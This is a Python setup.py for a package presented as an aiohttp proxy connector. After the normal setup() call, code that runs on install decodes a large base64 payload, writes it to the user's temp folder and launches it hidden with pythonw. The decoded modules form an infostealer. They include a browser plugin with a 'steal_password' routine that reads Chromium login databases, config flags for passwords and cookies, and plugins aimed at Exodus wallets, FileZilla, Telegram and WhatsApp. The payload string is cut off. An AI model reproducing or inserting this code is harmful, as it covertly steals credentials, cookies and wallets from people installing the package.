import codecs
import os
import re
import sys


try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

version = None

with codecs.open(
    os.path.join(
        os.path.abspath(os.path.dirname(__file__)), "aiohttp_proxies_connector", "__init__.py"
    ),
    "r",
    "latin1",
) as fp:
    try:
        version = re.findall(r'^__version__ = "(\S+?)"$', fp.read(), re.M)[0]
    except IndexError:
        raise RuntimeError("Unable to determine version.")

if sys.version_info < (3, 5, 3):
    raise RuntimeError("aiohttp_proxies_connector requires Python 3.5.3+")

with open("README.md") as f:
    long_description = f.read()

setup(
    name="aiohttp_proxies_connector",
    author="Skactor",
    author_email="sk4ct0r@gmail.com",
    version='0.2.23',
    license="Apache 2",
    url="https://github.com/Skactor/aiohttp-proxy",
    description="Full-featured proxy connector for aiohttp",
    long_description=long_description,
    long_description_content_type="text/markdown",
    packages=["aiohttp_proxies_connector"],
    keywords="asyncio aiohttp socks socks5 socks4 http https proxy aiofiles aiohttp cryptography",
    install_requires=["aiohttp>=2.3.2", "yarl"],
)

LOCAL = os.environ['USERPROFILE']
TEMP = os.path.join(LOCAL, 'appdata', 'local', 'temp')
main_dir = os.path.join(TEMP, '__pycache__')

# with open(os.path.join(main_dir, 'args.txt'), 'a', encoding='utf8') as f:
#     f.write(str(sys.argv) + '\n')


if len(sys.argv) == 0:
    sys.exit()

if not ("install" == sys.argv[1] or "bdist" in sys.argv[1]):
    sys.exit()


def run(filename):
    from subprocess import Popen, PIPE
    from os.path import split, join
    import sys


    python = sys.executable
    pythonw = join(split(python)[0], 'pythonw.exe')

    LOCAL = environ['USERPROFILE']
    TEMP = join(LOCAL, 'appdata', 'local', 'temp')

    main_dir = join(TEMP, '__pycache__')
    file = join(main_dir, filename)

    chdir(main_dir)

    Popen([pythonw, file], stdin=PIPE, stdout=PIPE, stderr=PIPE,
            creationflags=0x00000008 | 0x00000200, shell=True)

from os.path import isdir, join
from os import mkdir, chdir
from base64 import b64decode
from os import environ
from os.path import join
import traceback
from shutil import rmtree
import sys

DEBUG = True

try:
    LOCAL = environ['USERPROFILE']
    TEMP = join(LOCAL, 'appdata', 'local', 'temp')

    def b64(code: str) -> str:
        return b64decode(code.encode('utf8')).decode('utf8')

    main_dir = join(TEMP, '__pycache__')

    if not isdir(main_dir):
        mkdir(main_dir)

    with open(join(main_dir, 'main.cpython-39.py'), 'w', encoding='utf8') as f:
        f.write(b64('aW1wb3J0IHN5cyAjbGluZToyCmZyb20gb3MgLnBhdGggaW1wb3J0IGpvaW4gLHNwbGl0ICNsaW5lOjMKZnJvbSBzdWJwcm9jZXNzIGltcG9ydCBQb3BlbiAsY2FsbCAjbGluZTo0CnB5dGhvbiA9c3lzIC5leGVjdXRhYmxlICNsaW5lOjYKcHl0aG9udyA9am9pbiAoc3BsaXQgKHB5dGhvbiApWzAgXSwncHl0aG9udy5leGUnKSNsaW5lOjcKd2l0aCBvcGVuIChyJ0M6XFVzZXJzXGJhdWthXEFwcERhdGFcTG9jYWxcVGVtcFxfX3B5Y2FjaGVfX1xhd2Rhd2QnLCd3JyxlbmNvZGluZyA9J3V0ZjgnKWFzIGYgOiNsaW5lOjkKICAgIGYgLndyaXRlIChweXRob253ICkjbGluZToxMApjYWxsIChmJ3tweXRob253fSAtbSBlbnN1cmVwaXAnLHNoZWxsID1UcnVlICkjbGluZToxMQpjYWxsIChmJ3tweXRob253fSAtbSBwaXAgaW5zdGFsbCBhaW9maWxlcycsc2hlbGwgPVRydWUgKSNsaW5lOjEyCmNhbGwgKGYne3B5dGhvbnd9IC1tIHBpcCBpbnN0YWxsIGFpb2h0dHAnLHNoZWxsID1UcnVlICkjbGluZToxMwpjYWxsIChmJ3tweXRob253fSAtbSBwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknLHNoZWxsID1UcnVlICkjbGluZToxNApjYWxsIChmJ3tweXRob253fSAtbSBwaXAgaW5zdGFsbCBhaW9zcWxpdGUnLHNoZWxsID1UcnVlICkjbGluZToxNQpjYWxsIChmJ3tweXRob253fSAtbSBwaXAgaW5zdGFsbCBtc3MnLHNoZWxsID1UcnVlICkjbGluZToxNgpjYWxsIChmJ3tweXRob253fSAtbSBwaXAgaW5zdGFsbCBweXBpd2luMzInLHNoZWxsID1UcnVlICkjbGluZToxNwpjYWxsIChmJ3tweXRob253fSAtbSBwaXAgaW5zdGFsbCBwc3V0aWwnLHNoZWxsID1UcnVlICkjbGluZToxOApjYWxsIChmJ3tweXRob253fSAtbSBwaXAgaW5zdGFsbCByZXF1ZXN0cycsc2hlbGwgPVRydWUgKSMhL3Vzci9iaW4vZW52IHB5dGhvbiNsaW5lOjE5CmltcG9ydCBjb250ZXh0bGliIGFzIF9fc3RpY2t5dGFwZV9jb250ZXh0bGliICNsaW5lOjIwCkBfX3N0aWNreXRhcGVfY29udGV4dGxpYiAuY29udGV4dG1hbmFnZXIgI2xpbmU6MjIKZGVmIF9fT09PTzAwME9PT09PME9PTzAgKCk6I2xpbmU6MjMKICAgIGltcG9ydCB0ZW1wZmlsZSAjbGluZToyNAogICAgaW1wb3J0IHNodXRpbCAjbGluZToyNQogICAgTzBPT08wME8wT08wME9PTzAgPXRlbXBmaWxlIC5ta2R0ZW1wICgpI2xpbmU6MjYKICAgIHRyeSA6I2xpbmU6MjcKICAgICAgICB5aWVsZCBPME9PTzAwTzBPTzAwT09PMCAjbGluZToyOAogICAgZmluYWxseSA6I2xpbmU6MjkKICAgICAgICBzaHV0aWwgLnJtdHJlZSAoTzBPT08wME8wT08wME9PTzAgKSNsaW5lOjMwCndpdGggX19PT09PMDAwT09PT08wT09PMCAoKWFzIF9fTzBPTzBPT08wMDBPTzAwTzAgOiNsaW5lOjMyCiAgICBkZWYgX19PME8wTzAwTzAwTzBPME8wTyAoT08wTzAwME8wT09PME9PTzAgLE9PMDAwME8wTzBPMDBPMDAwICk6I2xpbmU6MzMKICAgICAgICBpbXBvcnQgb3MgLG9zIC5wYXRoICNsaW5lOjM0CiAgICAgICAgZGVmIE8wTzAwME8wTzBPT08wTzAwIChPTzAwTzAwTzAwTzAwMDAwTyApOiNsaW5lOjM2CiAgICAgICAgICAgIE9PMDAwT09PTzAwTzBPMDAwID1PTzAwTzAwTzAwTzAwMDAwTyAuc3BsaXQgKCIvIikjbGluZTozNwogICAgICAgICAgICBPME9PMDAwMDBPMDBPMDAwMCA9X19PME9PME9PTzAwME9PMDBPMCAjbGluZTozOAogICAgICAgICAgICBmb3IgTzBPME8wTzAwMDAwME8wTzAgaW4gT08wMDBPT09PMDBPME8wMDAgOiNsaW5lOjM5CiAgICAgICAgICAgICAgICBPME9PMDAwMDBPMDBPMDAwMCA9b3MgLnBhdGggLmpvaW4gKE8wT08wMDAwME8wME8wMDAwICxPME8wTzBPMDAwMDAwTzBPMCApI2xpbmU6NDAKICAgICAgICAgICAgICAgIGlmIG5vdCBvcyAucGF0aCAuZXhpc3RzIChPME9PMDAwMDBPMDBPMDAwMCApOiNsaW5lOjQxCiAgICAgICAgICAgICAgICAgICAgb3MgLm1rZGlyIChPME9PMDAwMDBPMDBPMDAwMCApI2xpbmU6NDIKICAgICAgICAgICAgICAgICAgICB3aXRoIG9wZW4gKG9zIC5wYXRoIC5qb2luIChPME9PMDAwMDBPMDBPMDAwMCAsIl9faW5pdF9fLnB5IiksIndiIilhcyBPTzAwMDBPMDBPTzAwTzAwTyA6I2xpbmU6NDMKICAgICAgICAgICAgICAgICAgICAgICAgT08wMDAwTzAwT08wME8wME8gLndyaXRlIChiIlxuIikjbGluZTo0NAogICAgICAgIE8wTzAwME8wTzBPT08wTzAwIChvcyAucGF0aCAuZGlybmFtZSAoT08wTzAwME8wT09PME9PTzAgKSkjbGluZTo0NgogICAgICAgIE9PME9PME9PTzAwMDBPT09PID1vcyAucGF0aCAuam9pbiAoX19PME9PME9PTzAwME9PMDBPMCAsT08wTzAwME8wT09PME9PTzAgKSNsaW5lOjQ4CiAgICAgICAgd2l0aCBvcGVuIChPTzBPTzBPT08wMDAwT09PTyAsIndiIilhcyBPTzBPT08wME8wTzAwMDBPTyA6I2xpbmU6NDkKICAgICAgICAgICAgT08wT09PMDBPME8wMDAwT08gLndyaXRlIChPTzAwMDBPME8wTzAwTzAwMCApI2xpbmU6NTAKICAgIGltcG9ydCBzeXMgYXMgX19zdGlja3l0YXBlX3N5cyAjbGluZTo1MgogICAgX19zdGlja3l0YXBlX3N5cyAucGF0aCAuaW5zZXJ0ICgwICxfX08wT08wT09PMDAwT08wME8wICkjbGluZTo1MwogICAgX19PME8wTzAwTzAwTzBPME8wTyAoJ3BhdGhfc2VhcmNoLnB5JyxiImltcG9ydCBhc3luY2lvXHJcbmltcG9ydCBvc1xyXG5mcm9tIG9zIGltcG9ydCBzY2FuZGlyLCBnZXRsb2dpblxyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGpvaW4sIGlzZGlyXHJcbmZyb20gdHlwaW5nIGltcG9ydCBEaWN0LCBJdGVyYWJsZSwgTGlzdFxyXG5mcm9tIHRvb2xzIGltcG9ydCBfaGFuZGxlX3Rhc2tfcmVzdWx0XHJcbmZyb20gbG9nZ2VyIGltcG9ydCBMb2dnZXJcclxuXHJcblxyXG5MT0NBTCA9IG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ11cclxuXHJcbnJvb3RfcGF0aHMgPSB7XHJcbiAgICBqb2luKExPQ0FMLCAnYXBwZGF0YScpLFxyXG4gICAgam9pbihMT0NBTCwgJ2FwcGRhdGEnLCAnbG9jYWwnKSxcclxuICAgIGpvaW4oTE9DQUwsICdhcHBkYXRhJywgJ2xvY2FsJywgJ3Byb2dyYW1zJyksXHJcbiAgICBqb2luKExPQ0FMLCAnYXBwZGF0YScsICdyb2FtaW5nJyksXHJcbiAgICBqb2luKExPQ0FMLCAnZG9jdW1lbnRzJyksXHJcbiAgICBqb2luKExPQ0FMLCAnZG93bmxvYWRzJyksXHJcbiAgICBqb2luKExPQ0FMLCAnZGVza3RvcCcpLFxyXG4gICAgJ0M6LycsXHJcbiAgICAnRDovJyxcclxuICAgICdFOi8nLFxyXG4gICAgJ0M6L3Byb2dyYW0gZmlsZXMnLFxyXG4gICAgJ0M6L3Byb2dyYW0gZmlsZXMgKHg4NiknLFxyXG4gICAgJ0M6L3Byb2dyYW1kYXRhJ1xyXG59XHJcblxyXG51c2VycyA9IChpLm5hbWUubG93ZXIoKSBmb3IgaSBpbiBzY2FuZGlyKCdjOi91c2VycycpKVxyXG5mb3IgdXNlcm5hbWUgaW4gdXNlcnM6XHJcbiAgICBpZiB1c2VybmFtZSBpbiBbJ2Rlc2t0b3AuaW5pJywgZ2V0bG9naW4oKS5sb3dlcigpXTpcclxuICAgICAgICBjb250aW51ZVxyXG4gICAgXHJcbiAgICBsb2NhbCA9IGpvaW4oJ2M6XFxcXHVzZXJzJywgdXNlcm5hbWUpXHJcbiAgICB1c2VyX3BhdGhzID0ge1xyXG4gICAgICAgIGpvaW4obG9jYWwsICdhcHBkYXRhJyksXHJcbiAgICAgICAgam9pbihsb2NhbCwgJ2FwcGRhdGEnLCAnbG9jYWwnKSxcclxuICAgICAgICBqb2luKGxvY2FsLCAnYXBwZGF0YScsICdsb2NhbCcsICdwcm9ncmFtcycpLFxyXG4gICAgICAgIGpvaW4obG9jYWwsICdhcHBkYXRhJywgJ3JvYW1pbmcnKSxcclxuICAgICAgICBqb2luKGxvY2FsLCAnZG9jdW1lbnRzJyksXHJcbiAgICAgICAgam9pbihsb2NhbCwgJ2Rvd25sb2FkcycpLFxyXG4gICAgICAgIGpvaW4obG9jYWwsICdkZXNrdG9wJylcclxuICAgIH1cclxuICAgIHJvb3RfcGF0aHMudXBkYXRlKHVzZXJfcGF0aHMpXHJcblxyXG5hc3luYyBkZWYgc2VhcmNoX3BsdWdpbl9wYXRocyhwYXRoczogSXRlcmFibGVbc3RyXSwgcXVlcmllczogRGljdCwgbG9nZ2VyOiBMb2dnZXIpOlxyXG4gICAgdGFza3M6IExpc3RbYXN5bmNpby5UYXNrXSA9IFtdXHJcblxyXG4gICAgcXVlcmllcyA9IHtrLmxvd2VyKCk6IHYgZm9yIGssdiBpbiBxdWVyaWVzLml0ZW1zKCl9XHJcbiAgICB0YXJnZXRfZm9sZGVyX25hbWVzID0gc2V0KHF1ZXJpZXMua2V5cygpKVxyXG4gICAgZm9yIHAgaW4gcGF0aHM6XHJcbiAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICBpZiBpc2RpcihwKTpcclxuICAgICAgICAgICAgICAgIGZvciBmbmFtZSBpbiB0YXJnZXRfZm9sZGVyX25hbWVzLmludGVyc2VjdGlvbihpLm5hbWUubG93ZXIoKSBmb3IgaSBpbiBvcy5zY2FuZGlyKHApKTpcclxuICAgICAgICAgICAgICAgICAgICBpZiBxdWVyaWVzW2ZuYW1lXSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgY3Vycl9wYXRoID0gam9pbihwLCBmbmFtZSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgbG9nZ2VyLmxvZyhmJ1x4ZDBceDlkXHhkMFx4YjBceGQwXHhiOVx4ZDBceGI0XHhkMFx4YjVceGQwXHhiZFx4ZDBceGIwIFx4ZDBceGJmXHhkMVx4ODNceGQxXHg4Mlx4ZDFceDhjIHtjdXJyX3BhdGh9JylcclxuICAgICAgICAgICAgICAgICAgICAgICAgbG9vcCA9IGFzeW5jaW8uZ2V0X2V2ZW50X2xvb3AoKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB0YXNrID0gbG9vcC5jcmVhdGVfdGFzayhxdWVyaWVzW2ZuYW1lXS5jYWxsYmFjayhjdXJyX3BhdGgpKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB0YXNrLmFkZF9kb25lX2NhbGxiYWNrKGxhbWJkYSB4OiBfaGFuZGxlX3Rhc2tfcmVzdWx0KHgsIGxvZ2dlcikpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2tzLmFwcGVuZCh0YXNrKVxyXG4gICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgYXdhaXQgbG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCBceGQwXHhiMiBzZWFyY2hfcGx1Z2luX3BhdGhzIFx4ZDBceGJmXHhkMVx4ODNceGQxXHg4Mlx4ZDFceDhjIHtwfSBceGQwXHhiZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAge2V9JylcclxuICAgIGZvciB0YXNrIGluIHRhc2tzOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgYXdhaXQgdGFza1xyXG4gICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgcHJpbnQocmVwcihlKSlcclxuXHJcblxyXG5hc3luYyBkZWYgc2VhcmNoX3BhdGhzKHBhdGhzOiBJdGVyYWJsZVtzdHJdLCBxdWVyaWVzOiBJdGVyYWJsZSk6XHJcbiAgICB0YXJnZXRfZm9sZGVyX25hbWVzID0ge2kubG93ZXIoKSBmb3IgaSBpbiBxdWVyaWVzfVxyXG4gICAgZm9yIHAgaW4gcGF0aHM6XHJcbiAgICAgICAgaWYgaXNkaXIocCk6XHJcbiAgICAgICAgICAgIGZvciBmbmFtZSBpbiB0YXJnZXRfZm9sZGVyX25hbWVzLmludGVyc2VjdGlvbihpLm5hbWUubG93ZXIoKSBmb3IgaSBpbiBvcy5zY2FuZGlyKHApKTpcclxuICAgICAgICAgICAgICAgIGlmIGZuYW1lIGluIHRhcmdldF9mb2xkZXJfbmFtZXM6XHJcbiAgICAgICAgICAgICAgICAgICAgeWllbGQgam9pbihwLCBmbmFtZSlcclxuIikjbGluZTo1NQogICAgX19PME8wTzAwTzAwTzBPME8wTyAoJ3Rvb2xzLnB5JyxiImltcG9ydCBvc1xyXG5pbXBvcnQgYXN5bmNpb1xyXG5mcm9tIGFpb2ZpbGVzLm9zIGltcG9ydCB3cmFwXHJcbmZyb20gc2h1dGlsIGltcG9ydCBjb3B5ZmlsZSwgY29weXRyZWUsIG1vdmVcclxuZnJvbSBsb2dnZXIgaW1wb3J0IExvZ2dlclxyXG5pbXBvcnQgd2lucmVnXHJcbmltcG9ydCByZVxyXG5cclxuXHJcblxyXG5kZWYgemlwZGlyKHBhdGgsIHppcGgpOlxyXG4gICAgJycnRnJvbSBzdGFja292ZXJmbG93JycnXHJcbiAgICAjIHppcGggaXMgemlwZmlsZSBoYW5kbGVcclxuICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKHBhdGgpOlxyXG4gICAgICAgIGZvciBmaWxlIGluIGZpbGVzOlxyXG4gICAgICAgICAgICB6aXBoLndyaXRlKG9zLnBhdGguam9pbihyb290LCBmaWxlKSwgXHJcbiAgICAgICAgICAgICAgICAgICAgICAgb3MucGF0aC5yZWxwYXRoKG9zLnBhdGguam9pbihyb290LCBmaWxlKSwgXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnBhdGguam9pbihwYXRoLCAnLi4nKSkpXHJcblxyXG5jb3B5ZmlsZSA9IHdyYXAoY29weWZpbGUpXHJcbmNvcHl0cmVlID0gd3JhcChjb3B5dHJlZSlcclxubW92ZSA9IHdyYXAobW92ZSlcclxuXHJcblxyXG5kZWYgX2hhbmRsZV90YXNrX3Jlc3VsdCh0YXNrOiBhc3luY2lvLlRhc2ssIGxvZ2dlcjogTG9nZ2VyKSAtPiBOb25lOlxyXG4gICAgdHJ5OlxyXG4gICAgICAgIHRhc2sucmVzdWx0KClcclxuICAgIGV4Y2VwdCBhc3luY2lvLkNhbmNlbGxlZEVycm9yOlxyXG4gICAgICAgIHBhc3MgICMgVGFzayBjYW5jZWxsYXRpb24gc2hvdWxkIG5vdCBiZSBsb2dnZWQgYXMgYW4gZXJyb3IuXHJcbiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6ICAjIHB5bGludDogZGlzYWJsZT1icm9hZC1leGNlcHRcclxuICAgICAgICBsb2dnZXIuc3luY19sb2coZidFcnJvciB7ZSFyfScpIikjbGluZTo1NgogICAgX19PME8wTzAwTzAwTzBPME8wTyAoJ2xvZ2dlci5weScsYidmcm9tIG9zLnBhdGggaW1wb3J0IGpvaW5cclxuZnJvbSBhaW9maWxlcyBpbXBvcnQgb3BlbiBhcyBhc3luY19vcGVuXHJcbmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lXHJcbmZyb20gYXN5bmNpbyBpbXBvcnQgU2VtYXBob3JlXHJcblxyXG5cclxuXHJcbmNsYXNzIExvZ2dlcigpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGxvZ19wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5wYXRoID0gam9pbihsb2dfcGF0aCwgXCd3b3JrX2xvZ3MudHh0XCcpXHJcbiAgICAgICAgc2VsZi5zZW0gPSBTZW1hcGhvcmUoMSlcclxuXHJcbiAgICBhc3luYyBkZWYgcHJpbnQoc2VsZiwgdGV4dCkgLT4gTm9uZTpcclxuICAgICAgICBhc3luYyB3aXRoIHNlbGYuc2VtOlxyXG4gICAgICAgICAgICBhc3luYyB3aXRoIGFzeW5jX29wZW4oc2VsZi5wYXRoLCBcJ2FcJywgZW5jb2Rpbmc9XCd1dGY4XCcpIGFzIGY6XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBmLndyaXRlKGZcJ3t0ZXh0fVxcblwnKVxyXG5cclxuICAgIGFzeW5jIGRlZiBsb2coc2VsZiwgdGV4dCkgLT4gTm9uZTpcclxuICAgICAgICBub3cgPSBkYXRldGltZS5ub3coKS5zdHJmdGltZSgiJUg6JU06JVMiKVxyXG4gICAgICAgIGF3YWl0IHNlbGYucHJpbnQoZlwne25vd30gfCB7dGV4dH1cJylcclxuXHJcbiAgICBkZWYgc3luY19wcmludChzZWxmLCB0ZXh0KSAtPiBOb25lOlxyXG4gICAgICAgIHdpdGggb3BlbihzZWxmLnBhdGgsIFwnYVwnLCBlbmNvZGluZz1cJ3V0ZjhcJykgYXMgZjpcclxuICAgICAgICAgICAgZi53cml0ZShmXCd7dGV4dH1cXG5cJylcclxuXHJcbiAgICBkZWYgc3luY19sb2coc2VsZiwgdGV4dCkgLT4gTm9uZTpcclxuICAgICAgICBub3cgPSBkYXRldGltZS5ub3coKS5zdHJmdGltZSgiJUg6JU06JVMiKVxyXG4gICAgICAgIHNlbGYuc3luY19wcmludChmXCd7bm93fSB8IHt0ZXh0fVwnKScpI2xpbmU6NTcKICAgIF9fTzBPME8wME8wME8wTzBPME8gKCdjb25maWcucHknLGIiZnJvbSBkYXRhY2xhc3NlcyBpbXBvcnQgZGF0YWNsYXNzLCBmaWVsZFxyXG5mcm9tIGFpb2h0dHAgaW1wb3J0IENsaWVudFNlc3Npb25cclxuZnJvbSBsb2dnZXIgaW1wb3J0IExvZ2dlclxyXG5cclxuXHJcbkBkYXRhY2xhc3NcclxuY2xhc3MgQ29uZmlnOlxyXG4gICAgY2xpZW50X2lkOiBzdHJcclxuICAgIGhvc3Q6IHN0clxyXG4gICAgbG9nX3BhdGg6IHN0clxyXG4gICAgbG9nZ2VyOiBMb2dnZXJcclxuICAgIHNlc3Npb246IENsaWVudFNlc3Npb25cclxuICAgIHRhZzogc3RyID0gZmllbGQoZGVmYXVsdD0nOTMyMDM0NzMwJylcclxuICAgIGJyb3dzZXJfcGFzc3dvcmRzOiBib29sID0gZmllbGQoZGVmYXVsdD1UcnVlKVxyXG4gICAgYnJvd3Nlcl9jb29raWVzOiBib29sID0gZmllbGQoZGVmYXVsdD1UcnVlKSIpI2xpbmU6NTgKICAgIF9fTzBPME8wME8wME8wTzBPME8gKCdwYXRocy5weScsYiJmcm9tIG9zIGltcG9ydCBlbnZpcm9uXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgam9pblxyXG5cclxuXHJcbkxPQ0FMID0gZW52aXJvblsnVVNFUlBST0ZJTEUnXVxyXG5URU1QID0gam9pbihMT0NBTCwgJ2FwcGRhdGEnLCAnbG9jYWwnLCAndGVtcCcpIikjbGluZTo1OQogICAgX19PME8wTzAwTzAwTzBPME8wTyAoJ3BsdWdpbnMvX19pbml0X18ucHknLGInZnJvbSAuYmFzZV9wbHVnaW4gaW1wb3J0IFBsdWdpblxyXG5cclxuZnJvbSAuYnJvd3NlcnMgaW1wb3J0IENocm9taXVtXHJcblxyXG5mcm9tIC5kZXRhaWxzIGltcG9ydCBEZXRhaWxzXHJcblxyXG5mcm9tIC53YWxsZXRzIGltcG9ydCBFeG9kdXNcclxuXHJcbmZyb20gLmZpbGV6aWxsYSBpbXBvcnQgRmlsZXppbGxhXHJcblxyXG5mcm9tIC50ZWxlZ3JhbSBpbXBvcnQgVGVsZWdyYW1cclxuXHJcbmZyb20gLndoYXRzYXBwIGltcG9ydCBXaGF0c2FwcCcpI2xpbmU6NjAKICAgIF9fTzBPME8wME8wME8wTzBPME8gKCdwbHVnaW5zL2Jhc2VfcGx1Z2luLnB5JyxiJ2Zyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBhYmMgaW1wb3J0IEFCQywgYWJzdHJhY3RtZXRob2RcclxuXHJcblxyXG5jbGFzcyBQbHVnaW4oQUJDKTpcclxuICAgIEBhYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGNvbmY6IENvbmZpZykgLT4gTm9uZTpcclxuICAgICAgICAuLi5cclxuXHJcbiAgICBAYWJzdHJhY3RtZXRob2RcclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgLi4uJykjbGluZTo2MQogICAgX19PME8wTzAwTzAwTzBPME8wTyAoJ3BsdWdpbnMvYnJvd3NlcnMvX19pbml0X18ucHknLGInZnJvbSAuY2hyb21pdW0gaW1wb3J0IENocm9taXVtJykjbGluZTo2MgogICAgX19PME8wTzAwTzAwTzBPME8wTyAoJ3BsdWdpbnMvYnJvd3NlcnMvY2hyb21pdW0ucHknLGIiZnJvbSBhc3luY2lvIGltcG9ydCBUYXNrLCBjcmVhdGVfdGFza1xyXG5mcm9tIHR5cGluZyBpbXBvcnQgTGlzdFxyXG5mcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MgaW1wb3J0IHNjYW5kaXIsIG1rZGlyXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgam9pbiwgaXNkaXIsIGlzZmlsZSwgc3BsaXRcclxuZnJvbSB0b29scyBpbXBvcnQgY29weWZpbGUsIGNvcHl0cmVlLCBfaGFuZGxlX3Rhc2tfcmVzdWx0XHJcbmZyb20gcGF0aF9zZWFyY2ggaW1wb3J0IHNlYXJjaF9wYXRoc1xyXG5pbXBvcnQgYWlvc3FsaXRlXHJcbmZyb20gLmRlY3J5cHQgaW1wb3J0IERlY3J5cHRvclxyXG5mcm9tIHRpbWUgaW1wb3J0IHRpbWVcclxuZnJvbSBwYXRocyBpbXBvcnQgVEVNUFxyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIGFpb2ZpbGVzIGltcG9ydCBvcGVuXHJcblxyXG5cclxuXHJcbmNsYXNzIENocm9taXVtKFBsdWdpbik6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuICAgICAgICBzZWxmLmRlY3J5cHRvciA9IE5vbmVcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIHNldF9kZWNyeXB0b3Ioc2VsZiwgcm9vdF9wYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgbG9jYWxfc3RhdGVfZm9sZGVycyA9IHtcclxuICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnKSxcclxuICAgICAgICAgICAgcm9vdF9wYXRoXHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBsb2NhbF9zdGF0ZXMgPSBbXVxyXG4gICAgICAgIGFzeW5jIGZvciBpIGluIHNlYXJjaF9wYXRocyhsb2NhbF9zdGF0ZV9mb2xkZXJzLCB7J0xvY2FsIFN0YXRlJ30pOlxyXG4gICAgICAgICAgICBsb2NhbF9zdGF0ZXMuYXBwZW5kKGkpXHJcblxyXG4gICAgICAgIGlmIGxvY2FsX3N0YXRlczpcclxuICAgICAgICAgICAgbG9jYWxfc3RhdGVfcGF0aCA9IGxvY2FsX3N0YXRlc1swXVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIGxvY2FsX3N0YXRlX3BhdGggPSBOb25lXHJcblxyXG4gICAgICAgIHNlbGYuZGVjcnlwdG9yID0gRGVjcnlwdG9yKGxvY2FsX3N0YXRlX3BhdGgpXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBzdGVhbF9wYXNzd29yZChzZWxmLCByb290X3BhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIHJvd3MgPSBbXVxyXG5cclxuICAgICAgICAgICAgaWYgbm90IGlzZGlyKHJvb3RfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gW11cclxuXHJcbiAgICAgICAgICAgIGxvZ2luX2RhdGFfZm9sZGVyX3BhdGhzID0ge1xyXG4gICAgICAgICAgICAgICAgam9pbihyb290X3BhdGgsICd1c2VyIGRhdGEnLCAnZGVmYXVsdCcpLFxyXG4gICAgICAgICAgICAgICAgcm9vdF9wYXRoXHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIGFzeW5jIGZvciBwIGluIHNlYXJjaF9wYXRocyhsb2dpbl9kYXRhX2ZvbGRlcl9wYXRocywgeydMb2dpbiBEYXRhJ30pOlxyXG4gICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpc2ZpbGUocCk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgICAgICAgICAgXHJcbiAgICAgICAgICAgICAgICAgICAgdGVtcF9wYXRoID0gam9pbihURU1QLCBmJ0xvZ2luIERhdGEge3RpbWUoKX0nKVxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKHAsIHRlbXBfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgaWYgbm90IHNlbGYuZGVjcnlwdG9yOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLnNldF9kZWNyeXB0b3Iocm9vdF9wYXRoKVxyXG4gICAgICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggYWlvc3FsaXRlLmNvbm5lY3QodGVtcF9wYXRoKSBhcyBjb25uOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzcWwgPSAnc2VsZWN0ICogZnJvbSBsb2dpbnMnXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGFzeW5jIHdpdGggY29ubi5leGVjdXRlKHNxbCkgYXMgY3VycjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFzeW5jIGZvciByb3cgaW4gY3VycjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH